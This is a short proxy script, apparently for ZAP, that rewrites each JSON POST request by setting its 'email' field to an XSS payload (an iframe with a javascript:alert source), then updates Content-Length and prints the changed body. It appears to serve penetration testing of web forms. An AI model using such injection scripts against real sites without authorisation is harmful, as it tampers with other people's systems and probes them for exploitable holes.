import json

from org.parosproxy.paros.network import HttpHeader
from collections import OrderedDict

def invokeWith(msg):

  header = msg.getRequestHeader()

  if(not(header.getHeader("Content-Type"))
    or not(header.getHeader("Content-Type").__contains__("application/json"))
    or header.getMethod() != "POST"
    or msg.getRequestBody().length() == 0
  ):
    return

  body = msg.getRequestBody().toString()
  try:
    data = json.loads(body,object_pairs_hook = OrderedDict)
  except:
    print("failed")
    return

  data["email"] = "<iframe src=\"javascript:alert('xss')\">"
  new_body = json.dumps(data)
  msg.setRequestBody(new_body)
  msg.getRequestHeader().setContentLength(msg.getRequestBody().length())

  print(msg.getRequestBody()) #просмотр нового тела запроса
